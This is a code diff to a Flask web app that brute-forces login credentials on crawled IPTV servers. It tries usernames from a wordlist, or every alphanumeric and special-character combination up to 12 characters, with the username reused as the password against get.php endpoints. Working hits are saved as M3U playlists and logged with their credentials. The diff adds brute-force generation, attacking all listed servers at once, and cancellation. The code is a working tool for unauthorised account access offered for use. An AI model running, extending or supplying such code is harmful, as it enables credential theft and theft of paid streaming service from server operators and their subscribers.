@@ -3,6 +3,8 @@ import random
 import threading
 import logging
 import time
+import string
+import itertools
 from flask import Flask, render_template, jsonify, request, send_from_directory
 from flask_cors import CORS
 import Crawler
@@ -19,11 +21,11 @@ CORS(app)
 
 crawler = Crawler.Crawler("it")
 
-# Global found accounts store
 found_accounts_list = []
 
 scan_state = {
     "is_scanning": False,
+    "cancel_requested": False,
     "progress": 0,
     "total": 0,
     "current_url": "",
@@ -31,6 +33,7 @@ scan_state = {
     "found_accounts": 0,
     "eta_seconds": 0,
     "elapsed_seconds": 0,
+    "attack_mode": "dictionary",
     "logs": []
 }
 
@@ -40,6 +43,13 @@ def log_event(message, to_console=False):
         scan_state["logs"].pop(0)
     if to_console:
         logger.info(message)
+
+def generate_alphanumeric_generator(min_len=1, max_len=12):
+    """Generator for 1 to 12 character alphanumeric & special character combinations"""
+    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
+    for length in range(min_len, max_len + 1):
+        for combo in itertools.product(chars, repeat=length):
+            yield "".join(combo)
 
 @app.route("/")
 def index():
@@ -54,6 +64,22 @@ def get_status():
         "scan_state": scan_state,
         "found_accounts_list": found_accounts_list
     })
+
+@app.route("/api/save-servers", methods=["POST"])
+def save_servers():
+    success = crawler.save_servers_to_disk()
+    if success:
+        return jsonify({"success": True, "message": "Servers list saved to disk successfully."})
+    return jsonify({"success": False, "message": "Failed to save servers to disk."}), 500
+
+@app.route("/api/remove-url", methods=["POST"])
+def remove_url():
+    data = request.json or {}
+    url = data.get("url", "").strip()
+    if crawler.remove_server_url(url):
+        log_event(f"Removed server URL: {url}", to_console=True)
+        return jsonify({"success": True, "parsed_urls": crawler.parsedUrls})
+    return jsonify({"success": False, "message": "Server URL not found"}), 400
 
 @app.route("/api/add-url", methods=["POST"])
 def add_url():
@@ -93,101 +119,139 @@ def change_language():
     else:
         return jsonify({"success": False, "message": f"Language file for {lang} not found"}), 400
 
+@app.route("/api/cancel-scan", methods=["POST"])
+def cancel_scan():
+    if not scan_state["is_scanning"]:
+        return jsonify({"message": "No scan is currently running."})
+    scan_state["cancel_requested"] = True
+    msg = "Cancellation requested by user. Stopping attack..."
+    scan_state["status_message"] = msg
+    log_event(msg, to_console=True)
+    return jsonify({"status": "Cancellation requested"})
+
 @app.route("/api/scan", methods=["POST"])
 def start_scan():
     if scan_state["is_scanning"]:
         return jsonify({"error": "Scan already in progress"}), 400
 
     data = request.json or {}
-    url = data.get("url")
+    target_url = data.get("url")
+    attack_all = data.get("attack_all", False)
+    charset_mode = data.get("mode", "dictionary") # "dictionary" or "alphanumeric"
+    max_len = data.get("max_length", 12)
 
     def run_scan():
         scan_state["is_scanning"] = True
+        scan_state["cancel_requested"] = False
         scan_state["progress"] = 0
         scan_state["found_accounts"] = 0
         scan_state["eta_seconds"] = 0
         scan_state["elapsed_seconds"] = 0
+        scan_state["attack_mode"] = charset_mode
         
-        target_url = url if url else (random.choice(crawler.parsedUrls) if crawler.parsedUrls else None)
-        if not target_url:
+        targets = []
+        if attack_all:
+            targets = list(crawler.parsedUrls)
+        elif target_url:
+            targets = [target_url]
+        elif crawler.parsedUrls:
+            targets = [random.choice(crawler.parsedUrls)]
+
+        if not targets:
             scan_state["is_scanning"] = False
-            msg = "No server URLs available. Run search or add a server URL."
+            msg = "No target server URLs available. Run search or add a server URL."
             scan_state["status_message"] = msg
             log_event(msg, to_console=True)
             return
 
-        scan_state["current_url"] = target_url
-        msg_start = f"Starting scan on target: {target_url}"
-        scan_state["status_message"] = f"Scanning {target_url}..."
-        log_event(msg_start, to_console=True)
-
-        lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
-        if not os.path.exists(lang_file):
-            scan_state["is_scanning"] = False
-            scan_state["status_message"] = "Language file missing."
-            log_event("Error: Language file missing.", to_console=True)
-            return
-
-        with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
-            lines = [line.strip() for line in f if line.strip()]
-
-        total_lines = len(lines)
-        scan_state["total"] = total_lines
-        found = 0
-        start_time = time.time()
-
         headers = {'User-Agent': 'Mozilla/5.0'}
         import requests
-        for idx, username in enumerate(lines, start=1):
-            scan_state["progress"] = idx
-            
-            elapsed = time.time() - start_time
-            scan_state["elapsed_seconds"] = int(elapsed)
-            if idx > 1:
-                avg_time_per_item = elapsed / idx
-                remaining_items = total_lines - idx
-                scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
 
-            log_event(f"request for name: {username}", to_console=False)
-            
-            if idx % 25 == 0 or idx == total_lines:
-                logger.info(f"Scan progress on {target_url}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+        for server in targets:
+            if scan_state["cancel_requested"]:
+                break
 
-            target = target_url + crawler.basicString % (username, username)
-            try:
-                res = requests.get(target, headers=headers, timeout=4)
-                if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
-                    domain = target_url.replace("http://", "").replace("https://", "").strip("/")
-                    new_path = os.path.join(crawler.outputDir, domain)
-                    crawler.create_file(username, new_path, res.text)
-                    found += 1
-                    scan_state["found_accounts"] = found
-                    
-                    m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
-                    playlist_url = f"{target_url}/get.php?username={username}&password={username}&type=m3u&output=mpegts"
-                    
-                    account_data = {
-                        "server": target_url,
-                        "username": username,
-                        "password": username,
-                        "file_path": m3u_file_path,
-                        "playlist_url": playlist_url
-                    }
-                    found_accounts_list.append(account_data)
+            scan_state["current_url"] = server
+            msg_start = f"Starting attack on target: {server}"
+            scan_state["status_message"] = f"Attacking {server}..."
+            log_event(msg_start, to_console=True)
 
-                    msg_found = f"ACCOUNT FOUND !!! -> Username: '{username}' | Password: '{username}' | Server: '{target_url}' | Saved file: '{m3u_file_path}'"
-                    log_event(msg_found, to_console=True)
-            except Exception:
-                pass
+            word_stream = []
+            if charset_mode == "alphanumeric":
+                # Alphanumeric stream limited to max_len (e.g. 12 chars)
+                log_event(f"Using Alphanumeric & Special Chars brute force (Up to {max_len} chars)...", to_console=True)
+                word_stream = generate_alphanumeric_generator(min_len=1, max_len=max_len)
+                total_lines = 1000000 # Streaming total estimate
+            else:
+                lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
+                if not os.path.exists(lang_file):
+                    log_event("Error: Language file missing.", to_console=True)
+                    continue
+                with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
+                    word_stream = [line.strip() for line in f if line.strip()]
+                total_lines = len(word_stream)
 
-        if target_url in crawler.parsedUrls:
-            crawler.parsedUrls.remove(target_url)
+            scan_state["total"] = total_lines
+            found = 0
+            start_time = time.time()
 
+            for idx, username in enumerate(word_stream, start=1):
+                if scan_state["cancel_requested"]:
+                    log_event(f"Attack cancelled on {server}.", to_console=True)
+                    break
+
+                scan_state["progress"] = idx
+                elapsed = time.time() - start_time
+                scan_state["elapsed_seconds"] = int(elapsed)
+                if idx > 1:
+                    avg_time_per_item = elapsed / idx
+                    remaining_items = total_lines - idx
+                    scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)
+
+                log_event(f"request for name: {username}", to_console=False)
+                
+                if idx % 50 == 0:
+                    logger.info(f"Progress on {server}: {idx}/{total_lines} - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")
+
+                target_endpoint = server + crawler.basicString % (username, username)
+                try:
+                    res = requests.get(target_endpoint, headers=headers, timeout=4)
+                    if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
+                        domain = server.replace("http://", "").replace("https://", "").strip("/")
+                        new_path = os.path.join(crawler.outputDir, domain)
+                        crawler.create_file(username, new_path, res.text)
+                        found += 1
+                        scan_state["found_accounts"] += 1
+                        
+                        m3u_file_path = os.path.join(domain, f"tv_channels_{username}.m3u").replace("\\", "/")
+                        playlist_url = f"{server}/get.php?username={username}&password={username}&type=m3u&output=mpegts"
+                        
+                        account_data = {
+                            "server": server,
+                            "username": username,
+                            "password": username,
+                            "file_path": m3u_file_path,
+                            "playlist_url": playlist_url
+                        }
+                        found_accounts_list.append(account_data)
+
+                        msg_found = f"ACCOUNT FOUND !!! -> Username: '{username}' | Password: '{username}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
+                        log_event(msg_found, to_console=True)
+                except Exception:
+                    pass
+
+            if server in crawler.parsedUrls and not scan_state["cancel_requested"]:
+                crawler.parsedUrls.remove(server)
+                crawler.save_servers_to_disk()
+
+        was_cancelled = scan_state["cancel_requested"]
         scan_state["is_scanning"] = False
+        scan_state["cancel_requested"] = False
         scan_state["eta_seconds"] = 0
-        msg_done = f"Scan completed for {target_url}. Total accounts found: {found}"
-        scan_state["status_message"] = msg_done
-        log_event(msg_done, to_console=True)
+        
+        msg_final = "Attack stopped by user." if was_cancelled else "All target attacks completed."
+        scan_state["status_message"] = msg_final
+        log_event(msg_final, to_console=True)
 
     thread = threading.Thread(target=run_scan)
     thread.start()
